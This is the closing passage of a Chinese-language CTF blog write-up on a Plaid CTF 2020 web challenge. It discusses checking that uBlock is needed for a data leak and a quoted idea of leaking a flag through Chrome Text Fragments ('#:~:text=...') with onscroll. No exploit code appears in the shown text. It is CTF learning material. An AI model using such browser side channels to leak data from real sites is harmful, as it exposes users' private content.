<p>但是我们通过 <a class=link href=#Verification>Verification</a> 环节测试得到的结果确实需要 uBlock 来进行，由于自己时间并不是特别多，最近花太多时间在这题的复盘上，所以最近不打算再深究这部分的内容了，这部分的内容不仅涉及到 User Activation ，还涉及到一些关于 User Activation 抽象模型的代码实现，如果要深究的话就需要花比较多的时间了。</p>
<h3 id=verification>Verification</h3>
<p>至于验证为什么一定需要 uBlock 来参与，这部分验证也比较简单，就是自己创建一个 issue ，内容设置为一个用于测试的 FLAG，比如 PCTF{TEST} ，其他的跟 EXP 过程差不多，只需要把 FLAG 的地址换为自己测试 FLAG 的地址即可，然后可以通过<strong>关闭 Chrome 拓展 uBlock</strong> 来测一遍（最好是从 Chrome 拓展关闭，使用拓展本身的关闭并不是全站关闭），多测试几次就会发现确实需要引入 uBlock 来实现 Leak Data 。</p>
<h3 id=text-fragment>Text Fragment</h3>
<p>这里其实比较可惜的是 @wupco 师傅，他之前关注到了这个 chrome Text Fragment 的功能，并且也引起了他的注意是否可以利用<code>#:~:text=flag{this_is_a_flag}</code>的形式 leak data ，可惜他表示比赛的时候没有想起来。（不愧是老 CTFer ，一开口就知道是老 CTFer 了</p>
<blockquote>
<p>​ How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?</p>
</blockquote>
<p>{% twitter <a class=link href=https://twitter.com/wupco1996/status/1226938811147522060 target=_blank rel=noopener>https://twitter.com/wupco1996/status/1226938811147522060</a> %}</p>
<h3 id=other-web-challanges>Other Web Challanges</h3>
<p>这次比赛的 Web 都比较有意思，<a class=link href=https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/ target=_blank rel=noopener>Contrived Web Problem</a> 是一道 FTP 到 SSRF 的利用链，wp 可以看我的博客，但是只有英文部分，并且没有完整的 payload ，只聊了聊大致的思路，而且英文水平可能比较拙，不知道以后自己有没有空写中文的，自己也不太确定。 Mooz Chat 听 @wupco 师傅说是一个中间人劫持的 web 题，（太强大了，需要逆向，表示单凭自己弄不了），但是中间人劫持的题目确实令人耳目一新！如果师傅们有相关的思路或者 wp 欢迎一起交流！</p>
<h3 id=conclusion>Conclusion</h3>
<p>这次比赛的题个人觉得还是比较偏“侧信道”的，这类的题目我都觉得非常好玩，因为不同于传统的 Web 攻击，还通常引入了很多比较新的理念与攻击链，虽然 User Activation 相关的部分还没有完全弄明白，而且这个题作者还是故意引入的 uBlock 来协助我们做题，也算是比较的友好了，只不过可能我们没有完全 Get 到出题人的点。所以这次比赛对我而言更让人觉得耳目一新的是 Chrome 新特性 Text Fragemnts ，让人研究的更多的是 User Activation 。</p>
<p>虽然这种题目对于实战可能显得鸡肋，甚至“毫无作用”，但是这类题目我觉得打开了自己的视野，让我关注到了更多新东西，更何况这类的题目在国内还是很少见到的，毕竟弄这类题目，从主要攻击链构造到细节设置都需要精心的揣摩与推敲，更何况是“侧信道”的题目，没有深厚的技术积淀出不来这类让全球大部分 CTFer 爆零的高难度的题目，也希望国内以后能出现一些这类高质量的题目吧。</p>
<h2 id=references>References</h2>
<p><a class=link href=https://www.chromestatus.com/feature/5722065667620864 target=_blank rel=noopener>User Activation v2</a></p>
<p><a class=link href=https://mustaqahmed.github.io/user-activation-v2/ target=_blank rel=noopener>User Activation v2 (UAv2)</a></p>
<p><a class=link href=https://developers.google.com/web/updates/2019/01/user-activation target=_blank rel=noopener>Making user activation consistent across APIs</a></p>
<p><a class=link href="https://docs.google.com/document/d/1mcxB5J_u370juJhSsmK0XQONG2CIE3mvu827O-Knw_Y/edit#heading=h.hy5wkxbrpq6o" target=_blank rel=noopener>Existing Chrome APIs using user gestures</a></p>
<p><a class=link href=https://github.com/dtapuska/useractivation target=_blank rel=noopener>JS API for querying User Activation</a></p>
<p><a class=link href=https://mustaqahmed.github.io/user-activation-delegation/ target=_blank rel=noopener>Activation Transfer through postMessages</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
<a href=/tags/wp/>wp</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2020/04/20/Plaid-CTF-2020-Web-1/>
<div class=article-details>
<h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2>
</div>
</a>
</article>
<article>
<a href=/2019/06/04/2019qwb/>
<div class=article-details>
<h2 class=article-title>2019强网杯部分Web wp</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/30/2019iscc/>
<div class=article-details>
<h2 class=article-title>2019 ISCC Web wp</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/09/2019ciscn-RefSpace/>
<div class=article-details>
<h2 class=article-title>2019 CISCN RefSpace</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/06/2019ciscn/>
<div class=article-details>
<h2 class=article-title>2019 CISCN Web wp</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#information>Information</a>
<ol>
<li><a href=#csp>CSP</a></li>
</ol>
</li>
<li><a href=#exp>Exp</a>
<ol>
<li><a href=#user-activation>User Activation</a></li>
<li><a href=#ublock>uBlock</a></li>
<li><a href=#how-to-get-the-flag>How to get the FLAG</a></li>
<li><a href=#text-fragments>Text Fragments</a></li>
<li><a href=#lettering>Lettering</a></li>
<li><a href=#spark-thinking>Spark Thinking</a></li>
<li><a href=#ublock--user-activation--text-fragments>uBlock & User Activation & Text Fragments</a></li>
<li><a href=#regex>Regex</a></li>
<li><a href=#reproduce>Reproduce</a></li>
<li><a href=#detailed-attack-chain>Detailed Attack Chain</a></li>
</ol>
</li>
<li><a href=#other>Other</a>
<ol>
<li><a href=#postmessage>postMessage</a></li>
<li><a href=#verification>Verification</a></li>
<li><a href=#text-fragment>Text Fragment</a></li>
<li><a href=#other-web-challanges>Other Web Challanges</a></li>
<li><a href=#conclusion>Conclusion</a></li>
</ol>
</li>
<li><a href=#references>References</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>